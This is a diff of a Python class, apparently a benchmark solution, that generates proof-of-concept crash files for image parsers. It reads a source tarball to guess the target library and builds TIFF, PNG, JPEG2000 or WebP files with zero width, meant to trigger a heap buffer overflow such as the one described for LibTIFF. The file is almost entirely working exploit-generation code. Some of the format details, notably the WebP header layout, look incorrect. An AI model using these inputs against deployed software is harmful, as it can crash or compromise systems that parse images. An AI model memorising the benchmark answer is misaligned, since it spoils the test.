@@ -1,59 +1,167 @@
 import struct
+import tarfile
+import zlib
+import io
+import os
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the vulnerability.
-        Target: LibTIFF (Heap Buffer Overflow due to zero width)
+        Attempts to identify the library from the source path and generates
+        a format-specific file with zero width/height.
         """
-        # We construct a TIFF file with ImageWidth=0.
-        # Vulnerable versions calculate buffer size as 0 (based on width),
-        # then attempt to read StripByteCounts bytes into it, causing a heap overflow.
+        project = self._identify_project(src_path)
         
-        # Little Endian TIFF Header: "II" (0x4949), 42 (0x002A), Offset to IFD (8)
-        poc = bytearray(struct.pack('<2sHI', b'II', 42, 8))
+        if project == 'tiff':
+            return self._gen_tiff()
+        elif project == 'png':
+            return self._gen_png()
+        elif project == 'openjpeg':
+            return self._gen_j2k()
+        elif project == 'webp':
+            return self._gen_webp()
+        else:
+            # Fallback to TIFF as it's the most common target for this vulnerability description
+            return self._gen_tiff()
+
+    def _identify_project(self, src_path):
+        try:
+            mode = 'r:*'
+            if src_path.endswith('.gz') or src_path.endswith('.tgz'):
+                mode = 'r:gz'
+            elif src_path.endswith('.xz'):
+                mode = 'r:xz'
+            elif src_path.endswith('.bz2'):
+                mode = 'r:bz2'
+                
+            with tarfile.open(src_path, mode) as tar:
+                # Check first 500 members to identify library
+                count = 0
+                for member in tar:
+                    name = member.name.lower()
+                    if 'tif_' in name or 'libtiff' in name:
+                        return 'tiff'
+                    if 'png.c' in name or 'libpng' in name:
+                        return 'png'
+                    if 'openjpeg' in name or 'opj_' in name:
+                        return 'openjpeg'
+                    if 'webp' in name:
+                        return 'webp'
+                    
+                    count += 1
+                    if count > 500:
+                        break
+        except Exception:
+            pass
+        return 'tiff'
+
+    def _gen_tiff(self):
+        # Generate TIFF with ImageWidth=0 to trigger heap overflow in LibTIFF
+        # Header: Little Endian
+        header = b'II\x2a\x00\x08\x00\x00\x00'
         
-        strip_len = 512  # Large enough to overflow a small heap chunk
+        w = 0
+        h = 10
         
-        # Calculate offsets
-        # Header: 8 bytes
-        # IFD Count: 2 bytes
-        # Entries: 10 entries * 12 bytes = 120 bytes
-        # Next IFD: 4 bytes
-        # Total IFD size: 126 bytes
-        # IFD starts at 8, ends at 134
-        
-        offset_bps = 134
-        # BPS data is 3 shorts (6 bytes), ends at 140
-        offset_strip = 140
-        
-        # TIFF Tags
+        # IFD Entries
         tags = [
-            (256, 4, 1, 0),            # ImageWidth: 0 (The Trigger)
-            (257, 4, 1, 10),           # ImageLength: 10
-            (258, 3, 3, offset_bps),   # BitsPerSample: 8,8,8 (offset)
-            (259, 3, 1, 1),            # Compression: None
-            (262, 3, 1, 2),            # PhotometricInterpretation: RGB
-            (273, 4, 1, offset_strip), # StripOffsets
-            (277, 3, 1, 3),            # SamplesPerPixel: 3
-            (278, 4, 1, 10),           # RowsPerStrip: 10
-            (279, 4, 1, strip_len),    # StripByteCounts
-            (284, 3, 1, 1)             # PlanarConfiguration: Chunky
+            (256, 4, 1, w),       # ImageWidth = 0
+            (257, 4, 1, h),       # ImageLength = 10
+            (258, 3, 1, 8),       # BitsPerSample = 8
+            (259, 3, 1, 1),       # Compression = None
+            (262, 3, 1, 1),       # PhotometricInterpretation = BlackIsZero
+            (273, 4, 1, 0),       # StripOffsets (placeholder)
+            (277, 3, 1, 1),       # SamplesPerPixel = 1
+            (278, 4, 1, h),       # RowsPerStrip = 10
+            (279, 4, 1, 100),     # StripByteCounts = 100
         ]
-        
-        # Sort tags by ID as required by TIFF spec
         tags.sort(key=lambda x: x[0])
         
-        # Write IFD
-        poc.extend(struct.pack('<H', len(tags))) # Num entries
-        for tag, type_, count, val in tags:
-            poc.extend(struct.pack('<HHII', tag, type_, count, val))
-        poc.extend(struct.pack('<I', 0)) # Next IFD offset
+        num_entries = len(tags)
+        ifd = bytearray(struct.pack('<H', num_entries))
+        for t in tags:
+            ifd.extend(struct.pack('<HHII', *t))
+        ifd.extend(struct.pack('<I', 0)) # Next IFD
         
-        # Write BitsPerSample data
-        poc.extend(struct.pack('<HHH', 8, 8, 8))
+        # Pixel Data
+        data = b'\x00' * 100
         
-        # Write Strip Data
-        poc.extend(b'A' * strip_len)
+        # Calculate offset for StripOffsets
+        # Header (8) + IFD Size + Data
+        ifd_offset = 8
+        data_offset = ifd_offset + len(ifd)
         
-        return bytes(poc)
+        # Patch StripOffsets in IFD
+        # IFD starts at ifd_offset
+        # Structure: Count(2), Entry(12)...
+        for i in range(num_entries):
+            off = 2 + i * 12
+            tag = struct.unpack_from('<H', ifd, off)[0]
+            if tag == 273:
+                struct.pack_into('<I', ifd, off+8, data_offset)
+                break
+                
+        return header + ifd + data
+
+    def _gen_png(self):
+        # Generate PNG with Width=0
+        sig = b'\x89PNG\r\n\x1a\n'
+        
+        # IHDR: Width=0, Height=10, 8 bit, ColorType 0
+        ihdr_payload = struct.pack('>IIBBBBB', 0, 10, 8, 0, 0, 0, 0)
+        ihdr = self._png_chunk(b'IHDR', ihdr_payload)
+        
+        # IDAT
+        idat_payload = zlib.compress(b'\x00' * 10)
+        idat = self._png_chunk(b'IDAT', idat_payload)
+        
+        # IEND
+        iend = self._png_chunk(b'IEND', b'')
+        
+        return sig + ihdr + idat + iend
+
+    def _png_chunk(self, type_, data):
+        crc = zlib.crc32(type_ + data) & 0xffffffff
+        return struct.pack('>I', len(data)) + type_ + data + struct.pack('>I', crc)
+
+    def _gen_j2k(self):
+        # OpenJPEG SIZ marker with Width=0
+        soc = b'\xff\x4f'
+        
+        # SIZ
+        # Lsiz, Rsiz, Xsiz(0), Ysiz(100)...
+        w = 0
+        h = 100
+        siz_content = struct.pack('>H', 0) # Rsiz
+        siz_content += struct.pack('>IIII', w, h, 0, 0) # Image/Grid size/offset
+        siz_content += struct.pack('>IIII', 100, 100, 0, 0) # Tile size/offset
+        siz_content += struct.pack('>H', 1) # Components
+        siz_content += b'\x07\x01\x01' # Precision, sub-sampling
+        
+        siz = b'\xff\x51' + struct.pack('>H', len(siz_content)+2) + siz_content
+        eoc = b'\xff\xd9'
+        
+        return soc + siz + eoc
+
+    def _gen_webp(self):
+        # WebP VP8 with Width=0
+        # VP8 Header
+        vp8_data = b'\x9d\x01\x2a' # Start code
+        # Width (14 bits) = 0
+        w = 0
+        h = 10
+        vp8_data += struct.pack('<HH', w, h)
+        
+        # Keyframe header bits (3 bytes)
+        # Keyframe=0 (bit 0=0), Ver=0, Show=1
+        vp8_header = b'\x10\x00\x00'
+        
+        chunk = vp8_header + vp8_data
+        if len(chunk) % 2:
+            chunk += b'\x00'
+            
+        file_len = 4 + 8 + len(chunk)
+        
+        return b'RIFF' + struct.pack('<I', file_len) + b'WEBPVP8 ' + \
+               struct.pack('<I', len(chunk)) + chunk
